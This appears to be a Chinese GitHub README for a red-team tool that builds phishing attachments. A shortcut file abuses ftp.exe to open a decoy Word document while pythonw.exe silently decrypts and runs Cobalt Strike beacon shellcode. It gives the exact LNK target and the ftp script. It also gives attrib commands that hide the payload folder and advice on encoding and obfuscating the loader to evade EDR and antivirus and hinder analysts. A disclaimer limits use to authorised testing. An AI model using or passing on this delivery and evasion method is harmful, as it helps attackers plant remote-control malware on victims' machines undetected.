## 前言
 
最近看到一些博客文章对红队样本做了一些分析，估计很快此方法便失效了，决定放出来供红队成员学习研究

https://xz.aliyun.com/t/15308?time__1311=GqjxnD2Citq05DK54CqiKq7KYAKW948OObD

https://www.52pojie.cn/thread-1956543-1-1.html

其实这种方式在很早之前便出现了，之前更多的是调用powershell易被拦截

https://www.freebuf.com/articles/web/325322.html

但通过调用一些白程序(pythonw、javaw)仍可以绕过许多EDR杀软

## 常规程序弊端

- 如果使用捆绑程序释放文档和木马，容易被EDR杀软会标记为恶意，如某数字杀软常会产生 `qvm 报毒拦截`
- 红队木马被上传沙箱后，容易失效并且可能会导致大量的虚拟beacon上线，对攻击方造成影响

## 使用方式

特此感谢 [pant0m](https://github.com/pant0m)，本工具在其基础上进行二改

1、`cobaltstrike` 生成 `beacon_x64.bin`，或者使用其他C2的shellcode，默认匹配当前目录的第一个bin文件

![image](https://github.com/user-attachments/assets/fc97cb09-f20c-4f38-b639-968d0cdbfb10)

2、运行`generate.py`，自动加密`shellcode`并复制到当前`__init__`文件夹下

![image](https://github.com/user-attachments/assets/bf3081fb-60fc-4bf2-b37f-68463473d453)

3、设置属性隐藏文件夹 `__init__`

```
attrib -s -h -r __init__
attrib +s +h +r __init__
```

LNK属性填写

```
C:\Windows\System32\ftp.exe -""s:__init__\python.dll
```
![image](https://github.com/user-attachments/assets/3af29388-36b9-44f8-bffb-3f11b2ef488b)

python.dll 内容为

```
!start /b __init__\11.docx
!start /b __init__\pythonw.exe __init__\main.py
bye
```

## 实现效果

![e58ad4a8c625481495a7137bee2837e](https://github.com/user-attachments/assets/f9b781b9-795f-4304-ad68-67ddac4ab393)

## 代码加解密和混淆

shellcode处理可使用 https://github.com/EgeBalci/sgn

![image](https://github.com/user-attachments/assets/6dcff7a3-42f4-4194-afb5-06015a474395)

加载方式为了简便选择本地解密加载

如果说为了更好的防溯源和被蓝队捕获shellcode可使用远程加载的方式，但需要注意存储桶的权限配置

解密loader因为需要携带在附件内，所以需要尽可能混淆，增加蓝队的逆向难度

https://pyob.oxyry.com/

![image](https://github.com/user-attachments/assets/3ad71315-9824-49b5-8196-e75afee1668c) 

## 坑点细节

因为文件调用是在上一级目录下，因此`加密shellcode路径`应设置为相对的 `__init__/data.dat`

```
def loadjson (file ='__init__/data.dat'):#line:14
    with open (file ,'r',encoding ='utf-8')as O0OOO00O0OO0O0OO0 :#line:16
        OOO0O0OO000OOO0O0 =json .load (O0OOO00O0OO0O0OO0 )
```

pythonw.exe需要添加libs依赖才能正常运行，把文件夹下面的文件全部拷贝

```
C:\Users\Administrator\AppData\Local\Programs\Python\Python38\Lib
```
其实也可以使用javaw，像上面也有红队使用相关的样本，但是环境依赖太大不推荐，举一反三其他语言同理

## 声明

仅限用于技术研究和获得正式授权的攻防项目，请使用者遵守《中华人民共和国网络安全法》，切勿用于任何非法活动，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布者不承担任何法律及连带责任！

使用前先按照文档步骤一步一步来，报错问题自行百度解决，类似issue不予回复，感谢理解！

